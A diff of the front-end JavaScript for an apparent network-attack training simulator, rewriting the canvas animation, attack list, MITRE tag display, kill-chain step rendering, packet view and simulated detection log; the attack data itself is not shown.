+  ctx.beginPath();ctx.arc(p.x,p.y,r,0,Math.PI*2);
+  ctx.fillStyle=glow?n.c+'22':'#050505';ctx.fill();
+  ctx.strokeStyle=glow?n.c:'#1a1a1a';ctx.lineWidth=glow?1.5:1;ctx.stroke();
+  ctx.restore();
+  ctx.font='12px serif';ctx.textAlign='center';ctx.textBaseline='middle';
+  ctx.fillText(n.i,p.x,p.y-1);
+  ctx.font=glow?'bold 7px "Share Tech Mono"':'7px "Share Tech Mono"';
+  ctx.fillStyle=glow?n.c:'#2a2a2a';
+  ctx.fillText(n.l,p.x,p.y+r+9);
+}
+
+function drawEdge(a,b,col,glow){
+  const pa=npos(a),pb=npos(b);
+  ctx.save();
+  if(glow){ctx.shadowBlur=6;ctx.shadowColor=col;}
+  ctx.beginPath();ctx.moveTo(pa.x,pa.y);ctx.lineTo(pb.x,pb.y);
+  ctx.strokeStyle=glow?col+'99':'#0d0d0d';ctx.lineWidth=1;ctx.stroke();
+  ctx.restore();
+}
+
+function spawnPart(a,b,col){
+  const pa=npos(a),pb=npos(b);
+  parts.push({x:pa.x,y:pa.y,tx:pb.x,ty:pb.y,t:0,spd:0.014+Math.random()*0.01,col,sz:2+Math.random()*2});
+}
+
+function draw(){
+  if(!cv.width)return;
+  ctx.clearRect(0,0,cv.width,cv.height);
+  const atk=currentAtk;
+  if(!atk){
+    ['attacker','gateway','victim','internet'].forEach((n,i,a)=>{if(i>0)drawEdge(a[0],n,'#111',false);});
+    drawEdge('gateway','internet','#111',false);
+    ['attacker','victim','gateway','internet'].forEach(n=>drawNode(n,false));
     return;
   }
-
-  const atk = currentAttack;
-  const nodes = atk.nodes;
-  const flows = FLOWS[atk.attackFlow] || [];
-
-  // Draw edges
-  for (let i=0; i<nodes.length; i++) {
-    for (let j=i+1; j<nodes.length; j++) {
-      drawEdge(nodes[i], nodes[j], '#0e2535');
-    }
-  }
-
-  // Attack edges highlight
-  flows.forEach(([f, t, c]) => {
-    if (animating) drawEdge(f, t, c + '66');
+  const nodes=atk.nodes,flows=FLOWS[atk.flow]||[];
+  for(let i=0;i<nodes.length;i++)for(let j=i+1;j<nodes.length;j++)drawEdge(nodes[i],nodes[j],'#111',false);
+  if(animating)flows.forEach(([a,b,c])=>drawEdge(a,b,c,true));
+  if(animating&&fN%14===0){const f=flows[Math.floor(Math.random()*flows.length)];if(f)spawnPart(f[0],f[1],f[2]);}
+  parts=parts.filter(p=>p.t<1);
+  parts.forEach(p=>{
+    p.t=Math.min(1,p.t+p.spd);
+    p.x+=(p.tx-p.x)*p.spd*4;p.y+=(p.ty-p.y)*p.spd*4;
+    ctx.save();ctx.shadowBlur=10;ctx.shadowColor=p.col;
+    ctx.beginPath();ctx.arc(p.x,p.y,p.sz,0,Math.PI*2);ctx.fillStyle=p.col;ctx.fill();ctx.restore();
   });
-
-  // Spawn particles periodically during animation
-  if (animating && frameCount % 18 === 0) {
-    const flow = flows[Math.floor(Math.random()*flows.length)];
-    if (flow) spawnParticle(flow[0], flow[1], flow[2]);
-  }
-
-  updateParticles();
-  drawParticles();
-
-  // Draw nodes
-  nodes.forEach(n => drawNode(n, animating));
-
-  frameCount++;
-
-  if (animating) {
-    animFrame = requestAnimationFrame(drawNetwork);
-  }
+  nodes.forEach(n=>drawNode(n,animating));
+  fN++;
+  if(animating)raf=requestAnimationFrame(draw);
 }
 
-// ══════════════════════════════════════════════
-// RENDER ATTACKS LIST
-// ══════════════════════════════════════════════
-function renderAttackList() {
-  const container = document.getElementById('attackList');
-  container.innerHTML = ATTACKS.map(atk => `
-    <div class="attack-item" onclick="selectAttack('${atk.id}')" id="atk-${atk.id}">
-      <div class="attack-name">${atk.name}</div>
-      <div style="font-size:0.75rem;color:var(--text3);margin:0.1rem 0">${atk.subtitle}</div>
-      <div class="attack-meta">
-        <span class="tag tag-layer">${atk.layer}</span>
-        <span class="tag tag-impact">IMP:${atk.impact}</span>
-        <span class="tag tag-stealth">STL:${atk.stealth}</span>
+function renderList(){
+  document.getElementById('atkList').innerHTML=ATTACKS.map(a=>`
+    <div class="attack-item" id="ai-${a.id}" onclick="selectAtk('${a.id}')">
+      <div class="atk-name">${a.name}</div>
+      <div class="atk-sub">${a.sub}</div>
+      <div class="tags">
+        <span class="tag tl">${a.layer}</span>
+        <span class="tag ti">IMP:${a.impact}</span>
+        <span class="tag ts">STL:${a.stealth}</span>
       </div>
-    </div>
-  `).join('');
+    </div>`).join('');
 }
 
-// ══════════════════════════════════════════════
-// SELECT ATTACK
-// ══════════════════════════════════════════════
-function selectAttack(id) {
+function selectAtk(id){
   resetLab();
-  currentAttack = ATTACKS.find(a => a.id === id);
-  if (!currentAttack) return;
-
-  // UI active state
-  document.querySelectorAll('.attack-item').forEach(el => el.classList.remove('active'));
-  document.getElementById('atk-' + id).classList.add('active');
-
-  // Enable launch
-  document.getElementById('launchBtn').disabled = false;
-  document.getElementById('canvasLabel').textContent = `TARGET LOCKED — ${currentAttack.name.toUpperCase()}`;
-
-  // Scores
-  document.getElementById('scoreImpact').textContent = currentAttack.impact + '/10';
-  document.getElementById('scoreStealth').textContent = currentAttack.stealth + '/10';
-  document.getElementById('scoreComplex').textContent = currentAttack.complexity;
-  document.getElementById('scoreLayer').textContent = currentAttack.layer;
-
-  // MITRE
-  renderMitre(currentAttack.mitre);
-
-  // Tools
-  renderTools(currentAttack.tools);
-
-  // Steps (locked until launch)
-  renderSteps(currentAttack.phases, false);
-
-  // Draw static network
-  drawNetwork();
-
-  // Log
-  addLog('info', `[LAB] Attack loaded: ${currentAttack.name} — click LAUNCH to begin simulation`);
+  currentAtk=ATTACKS.find(a=>a.id===id);if(!currentAtk)return;
+  document.querySelectorAll('.attack-item').forEach(e=>e.classList.remove('active'));
+  document.getElementById('ai-'+id).classList.add('active');
+  document.getElementById('launchBtn').disabled=false;
+  document.getElementById('cvLabel').textContent=`TARGET LOCKED — ${currentAtk.name.toUpperCase()}`;
+  document.getElementById('sImpact').textContent=currentAtk.impact+'/10';
+  document.getElementById('sStealth').textContent=currentAtk.stealth+'/10';
+  document.getElementById('sComplex').textContent=currentAtk.complex;
+  document.getElementById('sLayer').textContent=currentAtk.layer;
+  document.getElementById('mitreBody').innerHTML=Object.entries(currentAtk.mitre).map(([tac,techs])=>
+    `<div class="mitre-tac">${tac}</div>${techs.map(t=>`<span class="mitre-tag">${t}</span>`).join('')}`).join('');
+  document.getElementById('toolBody').innerHTML=currentAtk.tools.map(t=>
+    `<div class="tool"><div class="tool-ico">${t.i}</div><div><div class="tool-n">${t.n}</div><div class="tool-u">${t.u}</div></div></div>`).join('');
+  renderPkt(currentAtk.packets);
+  renderChain(false);
+  draw();
+  addLog('info',`[LAB] Loaded: ${currentAtk.name} — press LAUNCH to simulate`);
 }
 
-function renderMitre(mitre) {
-  const box = document.getElementById('mitreBox');
-  box.innerHTML = Object.entries(mitre).map(([tactic, techs]) => `
-    <div class="mitre-tactic">${tactic.toUpperCase()}</div>
-    ${techs.map(t => `<span class="mitre-tag">${t}</span>`).join('')}
-  `).join('');
+function renderPkt(pkts){
+  const d=document.getElementById('pktDisplay');
+  if(!pkts||!pkts.length){d.innerHTML='<div class="pkt-empty">// No packet data</div>';return;}
+  d.innerHTML=pkts.map(p=>{
+    const fields=Object.entries(p.fields).map(([k,v])=>
+      `  <span class="pkt-field">${k.padEnd(14,' ')} </span><span class="pkt-val">${v}</span>`).join('\n');
+    return`<span class="pkt-layer">[ ${p.layer} ]</span>\n${fields}`;
+  }).join('\n\n');
 }
 
-function renderTools(tools) {
-  const list = document.getElementById('toolList');
-  list.innerHTML = tools.map(t => `
-    <div class="tool-item">
-      <div class="tool-icon">${t.icon}</div>
-      <div class="tool-info">
-        <div class="tool-name">${t.name}</div>
-        <div class="tool-use">${t.use}</div>
-      </div>
-    </div>
-  `).join('');
-}
-
-function renderSteps(phases, active) {
-  const container = document.getElementById('stepsContainer');
-  container.innerHTML = phases.map((phase, pi) => `
-    <div class="phase-block ${active ? (pi === 0 ? 'active' : '') : ''}" id="phase-${pi}">
-      <div class="phase-label">${phase.label}</div>
-      ${phase.steps.map((step, si) => `
-        <div class="step-item">
-          <div class="step-num">0${si+1}</div>
-          <div class="step-content">
-            <div class="step-title">${step.title}</div>
-            <div class="step-desc">${step.desc}</div>
-            ${step.cmd ? `<div class="step-cmd">${step.cmd.replace(/\n/g,'<br>')}</div>` : ''}
+function renderChain(active){
+  if(!currentAtk)return;
+  document.getElementById('chainBody').innerHTML=currentAtk.phases.map((ph,pi)=>`
+    <div class="phase" id="ph-${pi}">
+      <div class="phase-label">${ph.label}</div>
+      ${ph.steps.map((s,si)=>`
+        <div class="step">
+          <div class="step-n">0${si+1}</div>
+          <div style="flex:1">
+            <div class="step-t">${s.t}</div>
+            <div class="step-d">${s.d}</div>
+            ${s.cmd?`<div class="step-cmd" onclick="copyCmd(this,\`${s.cmd.replace(/`/g,"'")}\`)">${s.cmd}</div>`:''}
           </div>
-        </div>
-      `).join('')}
-    </div>
-  `).join('');
+        </div>`).join('')}
+    </div>`).join('');
+  if(active)document.getElementById('ph-0')?.classList.add('active');
 }
 
-// ══════════════════════════════════════════════
-// LAUNCH ATTACK
-// ══════════════════════════════════════════════
-function launchAttack() {
-  if (!currentAttack || animating) return;
+function copyCmd(el,cmd){
+  navigator.clipboard.writeText(cmd).then(()=>{
+    el.classList.add('copied');setTimeout(()=>el.classList.remove('copied'),1500);
+  });
+}
 
-  animating = true;
-  particles = [];
-  progress = 0;
-
-  document.getElementById('launchBtn').disabled = true;
-  document.getElementById('canvasLabel').textContent = `▶ ATTACK IN PROGRESS — ${currentAttack.name.toUpperCase()}`;
-
-  // Render steps active
-  renderSteps(currentAttack.phases, true);
-
-  // Progress bar
-  const fill = document.getElementById('progressFill');
-  const label = document.getElementById('progressLabel');
-
-  // Animate phases
-  const phases = currentAttack.phases;
-  let phaseIdx = 0;
-
-  progressInterval = setInterval(() => {
-    progress += 1.2;
-    if (progress > 100) progress = 100;
-    fill.style.width = progress + '%';
-    label.textContent = Math.round(progress) + '%';
-
-    // Unlock phases progressively
-    const unlockAt = [0, 25, 55, 80];
-    unlockAt.forEach((threshold, i) => {
-      if (progress >= threshold) {
-        const el = document.getElementById('phase-' + i);
-        if (el) {
+function launchAttack(){
+  if(!currentAtk||animating)return;
+  animating=true;parts=[];prog=0;
+  document.getElementById('launchBtn').disabled=true;
+  document.getElementById('cvLabel').textContent=`▶ ATTACKING — ${currentAtk.name.toUpperCase()}`;
+  renderChain(true);
+  const fill=document.getElementById('progFill'),pct=document.getElementById('progPct');
+  const logs=currentAtk.detLogs;
+  pt=setInterval(()=>{
+    prog=Math.min(100,prog+1.0);
+    fill.style.width=prog+'%';pct.textContent=Math.round(prog)+'%';
+    [0,25,55,80].forEach((th,i)=>{
+      if(prog>=th){
+        const el=document.getElementById('ph-'+i);
+        if(el&&!el.classList.contains('active')&&!el.classList.contains('done')){
           el.classList.add('active');
-          if (i > 0) {
-            const prev = document.getElementById('phase-' + (i-1));
-            if (prev) { prev.classList.remove('active'); prev.classList.add('done'); }
-          }
+          if(i>0){const prev=document.getElementById('ph-'+(i-1));if(prev){prev.classList.remove('active');prev.classList.add('done');}}
         }
       }
     });
-
-    // Inject detection logs
-    const logs = currentAttack.detectionLogs;
-    if (progress >= 30 && progress < 32) addLog(logs[0].type, logs[0].msg);
-    if (progress >= 55 && progress < 57) addLog(logs[1]?.type, logs[1]?.msg);
-    if (progress >= 75 && progress < 77) addLog(logs[2]?.type, logs[2]?.msg);
-    if (progress >= 92 && progress < 94) addLog(logs[3]?.type, logs[3]?.msg);
-
-    if (progress >= 100) {
-      clearInterval(progressInterval);
-      setTimeout(() => {
-        animating = false;
-        cancelAnimationFrame(animFrame);
-        document.getElementById('canvasLabel').textContent = `✓ ATTACK COMPLETE — ${currentAttack.name.toUpperCase()}`;
-        document.getElementById('launchBtn').disabled = false;
-        drawNetwork();
-        addLog('stealth', `[LAB] Simulation complete: ${currentAttack.name} — review detection log`);
-      }, 800);
+    if(prog>=25&&prog<27)addLog(logs[0].t,logs[0].m);
+    if(prog>=50&&prog<52)addLog(logs[1]?.t,logs[1]?.m);
+    if(prog>=75&&prog<77)addLog(logs[2]?.t,logs[2]?.m);
+    if(prog>=92&&prog<94)addLog(logs[3]?.t,logs[3]?.m);
+    if(prog>=100){
+      clearInterval(pt);
+      setTimeout(()=>{
+        animating=false;cancelAnimationFrame(raf);
+        document.getElementById('cvLabel').textContent=`✓ COMPLETE — ${currentAtk.name.toUpperCase()}`;
+        document.getElementById('launchBtn').disabled=false;
+        draw();addLog('stealth','[LAB] Simulation complete — review kill chain above');
+      },600);
     }
-  }, 60);
-
-  // Start animation loop
-  drawNetwork();
+  },55);
+  draw();
 }
 
-// ══════════════════════════════════════════════
-// RESET
-// ══════════════════════════════════════════════
-function resetLab() {
-  animating = false;
-  cancelAnimationFrame(animFrame);
-  clearInterval(progressInterval);
-  particles = [];
-  progress = 0;
-
-  document.getElementById('progressFill').style.width = '0%';
-  document.getElementById('progressLabel').textContent = '0%';
-  document.getElementById('launchBtn').disabled = true;
-  document.getElementById('canvasLabel').textContent = 'SELECT AN ATTACK TO BEGIN';
-
-  document.getElementById('stepsContainer').innerHTML = `
-    <div class="welcome-screen">
-      <div class="welcome-arrow">←</div>
-      <h2>SELECT AN ATTACK</h2>
-      <p>Choose a network attack from the left panel to see the full attacker kill chain with real tools and commands.</p>
-    </div>`;
-
-  document.getElementById('scoreImpact').textContent = '—';
-  document.getElementById('scoreStealth').textContent = '—';
-  document.getElementById('scoreComplex').textContent = '—';
-  document.getElementById('scoreLayer').textContent = '—';
-
-  document.getElementById('mitreBox').innerHTML = '<span style="font-family:var(--mono);font-size:0.7rem;color:var(--text3)">Select an attack to see MITRE mapping...</span>';
-  document.getElementById('toolList').innerHTML = '<span style="font-family:var(--mono);font-size:0.7rem;color:var(--text3);padding:0.5rem 0;display:block">No attack selected...</span>';
-
-  document.querySelectorAll('.attack-item').forEach(el => el.classList.remove('active'));
-  currentAttack = null;
-  drawNetwork();
+function resetLab(){
+  animating=false;cancelAnimationFrame(raf);clearInterval(pt);parts=[];prog=0;
+  document.getElementById('progFill').style.width='0%';
+  document.getElementById('progPct').textContent='0%';
+  document.getElementById('launchBtn').disabled=true;
+  document.getElementById('cvLabel').textContent='SELECT AN ATTACK TO BEGIN';
+  document.getElementById('chainBody').innerHTML=`<div class="welcome"><div class="w-arrow">←</div><h2>SELECT AN ATTACK</h2><p>Choose a network attack to see the full attacker kill chain.</p></div>`;
+  document.getElementById('pktDisplay').innerHTML='<div class="pkt-empty">// Select an attack to see real packet structure</div>';
+  document.getElementById('sImpact').textContent='—';document.getElementById('sStealth').textContent='—';
+  document.getElementById('sComplex').textContent='—';document.getElementById('sLayer').textContent='—';
+  document.getElementById('mitreBody').innerHTML='<span style="font-family:var(--mono);font-size:0.62rem;color:#1a1a1a">Select an attack...</span>';
+  document.getElementById('toolBody').innerHTML='<span style="font-family:var(--mono);font-size:0.62rem;color:#1a1a1a">No attack selected...</span>';
+  document.querySelectorAll('.attack-item').forEach(e=>e.classList.remove('active'));
+  currentAtk=null;draw();
 }
 
-// ══════════════════════════════════════════════
-// DETECTION LOG
-// ══════════════════════════════════════════════
-function addLog(type, msg) {
-  if (!msg) return;
-  const log = document.getElementById('detLog');
-  const entry = document.createElement('div');
-  entry.className = `log-entry ${type}`;
-  const ts = new Date().toTimeString().slice(0,8);
-  entry.textContent = `[${ts}] ${msg}`;
-  log.appendChild(entry);
-  log.scrollTop = log.scrollHeight;
-
-  // Cap log at 20 entries
-  while (log.children.length > 20) log.removeChild(log.firstChild);
+function addLog(type,msg){
+  if(!msg)return;
+  const log=document.getElementById('logBody');
+  const el=document.createElement('div');
+  el.className=`log-e ${type}`;
+  el.textContent=`[${new Date().toTimeString().slice(0,8)}] ${msg}`;
+  log.appendChild(el);log.scrollTop=log.scrollHeight;
+  while(log.children.length>25)log.removeChild(log.firstChild);
 }
 
-// ══════════════════════════════════════════════
-// INIT
-// ══════════════════════════════════════════════
-window.addEventListener('load', () => {
-  resizeCanvas();
-  renderAttackList();
-  drawNetwork();
-});
+window.addEventListener('load',()=>{resizeCv();renderList();draw();});
 </script>
 </body>
 </html>
